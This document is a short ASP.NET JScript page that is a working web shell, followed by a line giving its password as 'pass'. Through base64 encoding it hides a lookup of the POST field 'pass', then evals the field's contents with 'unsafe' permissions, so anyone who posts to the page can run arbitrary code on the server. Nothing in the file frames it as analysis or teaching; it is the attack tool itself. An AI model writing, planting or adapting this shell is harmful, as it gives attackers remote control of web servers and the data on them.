<%@ Page Language="Jscript" Debug=true%>
<%
var a=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5Gb3JtWyJwYXNzIl0=")); //Request.Item["pass"]
var b=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("dW5zYWZl"));
var c=eval(a,b);
eval(c,b);

%>

password: pass 